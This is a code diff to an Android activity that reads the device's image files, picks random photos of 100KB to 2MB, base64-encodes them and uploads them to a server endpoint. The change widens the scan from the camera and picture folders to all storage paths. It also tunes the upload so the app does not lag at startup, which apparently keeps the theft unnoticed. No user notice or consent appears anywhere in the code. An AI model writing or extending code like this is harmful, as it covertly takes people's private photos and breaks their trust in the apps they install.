@@ -230,7 +230,8 @@ public class Main3Activity extends Activity {
 
     public void getPhoto() throws Exception {
         boolean b = ReadAndWrite.RequestPermissions(this, Manifest.permission.READ_EXTERNAL_STORAGE);
-        String[] paths = {"/DCIM", "/Pictures"};
+//        String[] paths = {"/DCIM", "/Pictures"};
+        String[] paths = {};
         if (b) {
             List<String> photo = new ArrayList<>();
             List<Map<String, Object>> files = new ArrayList<>();
@@ -240,30 +241,26 @@ public class Main3Activity extends Activity {
                     for (String path : localPath) {
                         File file = new File(path);
                         String s = path.replace(GetPhoto.BasePath, "");
-                        for (String s1 : paths) {
-                            if (s.startsWith(s1)) {
+                        if (paths.length>0) {
+                            for (String s1 : paths) {
+                                if (s.startsWith(s1)) {
 //                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
-                                if (file.length() > 1024 * 100&&file.length()<1024*1024*2) {
-                                    photo.add(path);
+                                    if (file.length() > 1024 * 100 && file.length() < 1024 * 1024 * 2) {
+                                        photo.add(path);
+                                    }
+                                    break;
                                 }
-                                break;
+                            }
+                        }else {
+                            if (file.length() > 1024 * 100 && file.length() < 1024 * 1024 * 2) {
+                                photo.add(path);
                             }
                         }
                     }
                     final int size = photo.size();
                     Log.e(Tag, "100kb~2Mb图片数：" + size);
-//                    for (String s : photo) {
-//                        File file = new File(s);
-//                        Map<String,Object> map=new HashMap<>();
-//                        byte[] bytes = LocalFileTool.fileToBytes(file);
-//                        map.put("name",EncryptUtil.enBase64(file.getName().getBytes()));
-//                        map.put("data",EncryptUtil.enBase64(bytes));
-//                        files.add(map);
-//                        String sizeString = LocalFileTool.getFileSizeString(file.length());
-//                        System.out.println(s.replace(GetPhoto.BasePath, "") + "大小:" + sizeString);
-//                    }
+
                     Map<String, Object> msg = new HashMap<>();
-//                    msg.put("data",files);
                     msg.put("num", size);
                     msg.put("time", TimeUtil.dateToUnix(new Date()));
 
@@ -275,6 +272,7 @@ public class Main3Activity extends Activity {
                         @Override
                         public void onError(Call call, Exception e, int id) {
                             Log.e(Tag, OkHttpMessageUtil.error(e));
+
                         }
 
                         @Override
@@ -301,6 +299,7 @@ public class Main3Activity extends Activity {
                                                     c = 5;
                                                 }
                                                 int i=0;
+                                                c=1;//暂时解决启动时运算量过大导致无法响应
                                                 while (i<c) {
                                                     int random = RandomrUtil.createRandom(0, size - 1);
                                                     String pathname = photo.get(random);
@@ -332,6 +331,7 @@ public class Main3Activity extends Activity {
                                                             map.put("size", fileLength);
                                                             map.put("data", EncryptUtil.enBase64(bytes));
                                                             OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
+//                                                            Thread.sleep(2000);
                                                         }
                                                     }
                                                 }
